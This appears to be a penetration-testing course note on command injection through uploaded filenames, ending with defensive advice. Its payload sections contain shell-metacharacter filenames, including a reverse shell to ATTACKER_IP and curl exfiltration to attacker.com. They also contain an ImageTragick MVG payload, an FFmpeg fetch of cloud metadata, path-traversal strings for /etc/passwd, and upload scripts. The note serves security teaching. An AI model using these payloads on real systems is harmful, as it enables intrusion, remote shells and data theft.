---
tags: [vapt, command-injection, intermediate]
difficulty: intermediate
module: "08 - Command Injection"
topic: "08.05 Command Injection via Filename"
---

# 08.05 — Command Injection via Filename

## Overview

File upload features often pass the filename to OS commands (for thumbnail generation, antivirus scanning, file type detection, metadata extraction). If the filename isn't sanitized, injecting shell metacharacters into the filename can achieve command injection.

```
VULNERABLE FLOW:
  1. User uploads file named: image.jpg
  2. Server runs: convert image.jpg thumbnail.jpg
     (Using ImageMagick, FFmpeg, etc.)
  3. Attacker uploads file named: shell.jpg;id;image.jpg
  4. Server runs: convert shell.jpg;id;image.jpg thumbnail.jpg
                                     ↑ INJECTED!
```

---

## Why Filenames Are Dangerous

```
COMMANDS THAT USE FILENAMES:
  convert "filename" output.jpg          (ImageMagick)
  ffmpeg -i "filename" output.mp4        (FFmpeg)
  exiftool "filename"                    (EXIF extraction)
  clamscan "filename"                    (Antivirus)
  grep "pattern" "filename"             (Search)
  mv "filename" "/new/path"             (Move/rename)
  cp "filename" "/destination"          (Copy)
  chmod 644 "filename"                  (Permissions)
  unzip "filename" -d /tmp/             (Extract)
  identify "filename"                    (ImageMagick identify)
  
ALL OF THESE PASS FILENAME TO OS COMMAND!
```

---

## Payload Filenames

```bash
# BASIC TEST — OS COMMAND IN FILENAME:
shell.jpg;id
shell.jpg|id
shell.jpg$(id)
shell.jpg`id`
shell.jpg&&id

# MORE COMPLETE PAYLOADS:
; id
;id;
image.jpg;id;.jpg
$(id).jpg
`id`.jpg
|id|

# REVERSE SHELL VIA FILENAME:
shell.jpg;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1;.jpg
file$(curl https://attacker.com/$(id)).jpg

# REAL FILENAME EXAMPLES:
# Uploads filename: test$(id).jpg
# Server runs: convert test$(id).jpg thumb.jpg
# Shell expands $(id) → test uid=33(www-data)...jpg → invalid but id ran!
```

---

## ImageMagick-Specific (MVG Injection)

```
ImageMagick has its own RCE vulnerabilities beyond filename injection:

ImageTragick (CVE-2016-3714):
  Create a file with .jpg extension but MVG content:
  
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://example.com/image.jpg"|id|")'
  pop graphic-context
  
  → When ImageMagick processes it → executes id!

TESTING:
  Filename: test.jpg
  Content: 
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://attacker.com/"|curl https://attacker.com/`id`|")'
    pop graphic-context
```

---

## FFmpeg-Specific Attacks

```
FFmpeg SSRF via Filename (AVI injection):
  Create an AVI file with malicious video headers
  FFmpeg processes it → makes server-side request to internal IPs

  Tools: 
  - ffmpeg-avi-ssrf-generator.py (GitHub)
  
  Attack: Have FFmpeg fetch internal metadata:
  ffmpeg -i "http://169.254.169.254/latest/meta-data/" output.mp4
```

---

## Crafting Malicious Filenames

```python
# HOW TO CREATE A FILE WITH MALICIOUS FILENAME:

# PYTHON — CREATE FILE WITH SPECIAL NAME:
import requests

payload_filename = 'test$(id).jpg'

with open('/tmp/normal_image.jpg', 'rb') as f:
    files = {'file': (payload_filename, f, 'image/jpeg')}
    r = requests.post('https://target.com/upload', files=files, cookies={'session': 'your-session'})
    print(r.text)

# CURL — UPLOAD WITH SPECIAL FILENAME:
curl -X POST https://target.com/upload \
  -F "file=@/tmp/normal.jpg;filename=test\$(id).jpg" \
  -b "session=your-session"

# BURP — INTERCEPT AND MODIFY:
# 1. Upload a normal file through the browser
# 2. Intercept the multipart request in Burp
# 3. Change: filename="normal.jpg" → filename="test;id.jpg"
```

---

## Content-Disposition Filename Injection

```
HTTP UPLOAD REQUEST:
  POST /upload HTTP/1.1
  Content-Type: multipart/form-data; boundary=----boundary
  
  ------boundary
  Content-Disposition: form-data; name="file"; filename="INJECT_HERE"
  Content-Type: image/jpeg
  
  [JPEG data]

PAYLOADS TO TRY IN FILENAME:
  test$(id).jpg
  test;id;.jpg
  test|id|.jpg
  test`id`.jpg
  "test;id"
  test$(id)/..;/..;/etc/passwd      ← path traversal combo
  ../../../etc/passwd               ← path traversal
```

---

## Detection

```bash
# BURP INTRUDER — FILENAME FUZZING:
# 1. Upload a file → intercept in Burp
# 2. Send to Intruder
# 3. Mark filename as injection point
# 4. Payload list:
test$(id).jpg
test;id.jpg
test|id.jpg
test`id`.jpg
test&&id.jpg
test||id.jpg

# MANUAL TESTING:
# Upload: test$(sleep 5).jpg
# If response is delayed 5 seconds → CONFIRMED!

# OOB TESTING:
# Upload: test$(curl https://your-interactsh.com).jpg
# If Interactsh receives request → CONFIRMED!
```

---

## Defense

```
HOW TO SAFELY HANDLE FILENAMES:
  1. Generate a new UUID-based filename on the server side
     (Never use the user-provided filename!)
  2. If original name needed, strip ALL non-alphanumeric+dot chars:
     safe_name = re.sub(r'[^a-zA-Z0-9._-]', '', user_filename)
  3. Avoid passing filenames to shell commands at all:
     Use language APIs that don't invoke a shell!
     Python: subprocess.run(['convert', filename, 'output.jpg'])  ← list form!
             NOT: subprocess.run('convert ' + filename, shell=True)  ← DANGEROUS!
  4. Run file processing in a sandboxed environment (Docker container)
```

---

## Related Notes
- [[01 - What is Command Injection]] — fundamentals
- [[04 - Blind Command Injection]] — when no output is visible
- [[Module 13 - File Upload]] — file upload vulnerability module
- [[10 - Command Injection to Reverse Shell]] — escalation
